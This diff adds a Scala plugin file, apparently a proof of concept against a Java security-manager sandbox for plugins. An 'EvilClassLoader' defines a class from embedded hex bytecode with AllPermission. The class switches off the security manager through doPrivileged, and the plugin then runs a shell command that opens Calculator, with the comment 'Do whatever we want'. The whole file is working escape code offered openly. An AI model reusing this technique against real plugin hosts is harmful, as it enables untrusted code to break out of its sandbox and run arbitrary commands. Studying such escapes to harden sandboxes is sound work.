@@ -1,0 +1,59 @@
+package plugins
+
+import java.net.{URL, URLClassLoader}
+import java.security._
+
+import sandbox1.shared.Plugin
+
+/**
+  * Created by adrian.bravo on 3/4/17.
+  */
+class Plugin2 extends Plugin {
+  println("[PLUGIN] Initialising plugin")
+
+  class EvilClassLoader(urls: Array[URL]) extends URLClassLoader(urls: Array[URL]) {
+
+    def hex2ba(hex_str: String): Array[Byte] = {
+      val hex_ba: Array[Byte] = hex_str.grouped(2).map(
+        (hex_pair: String) => Integer.decode("0x" + hex_pair).byteValue()
+      ).toArray
+      hex_ba
+    }
+
+    /*static class B implements PrivilegedExceptionAction<Object> {
+		    public B() {
+			    try {
+				    AccessController.doPrivileged(this);
+			    } catch (Exception e) {
+			    }
+		    }
+
+		    public Object run() {
+			    System.setSecurityManager(null);
+			    return new Object();
+		    }
+	  }*/
+    val class_bytes = hex2ba("CAFEBABE0000003200270A000500180A0019001A07001B0A001C001D07001E07001F0700200100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010001650100154C6A6176612F6C616E672F457863657074696F6E3B010004746869730100034C423B01000D537461636B4D61705461626C6507001F07001B01000372756E01001428294C6A6176612F6C616E672F4F626A6563743B01000A536F7572636546696C65010006422E6A6176610C000800090700210C002200230100136A6176612F6C616E672F457863657074696F6E0700240C002500260100106A6176612F6C616E672F4F626A656374010001420100276A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E01001E6A6176612F73656375726974792F416363657373436F6E74726F6C6C657201000C646F50726976696C6567656401003D284C6A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E3B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01001273657453656375726974794D616E6167657201001E284C6A6176612F6C616E672F53656375726974794D616E616765723B295600210006000500010007000000020001000800090001000A0000006C000100020000000E2AB700012AB8000257A700044CB1000100040009000C00030003000B000000120004000000080004000B0009000C000D000D000C000000160002000D0000000D000E00010000000E000F001000000011000000100002FF000C00010700120001070013000001001400150001000A0000003A000200010000000C01B80004BB000559B70001B000000002000B0000000A00020000001000040011000C0000000C00010000000C000F0010000000010016000000020017")
+
+    override def findClass(name: String): Class[_] = {
+      if (name == "B") {
+        val permissions = new Permissions()
+        permissions.add(new AllPermission())
+
+        val cs = new CodeSource(new URL("file:/"), Array.empty[CodeSigner])
+        val protectionDomain = new ProtectionDomain(cs, permissions, this, Array.empty[Principal])
+        defineClass(name, class_bytes, 0, class_bytes.length, protectionDomain)
+      } else super.findClass(name)
+    }
+  }
+
+  override def run(): Unit = {
+    val ecl = new EvilClassLoader(Array.empty[URL])
+    val klass = ecl.loadClass("B")
+    // Disable security manager
+    klass.newInstance()
+    // Do whatever we want
+    Runtime.getRuntime.exec("open /Applications/Calculator.app/")
+    println("[PLUGIN] Plugin over")
+  }
+}
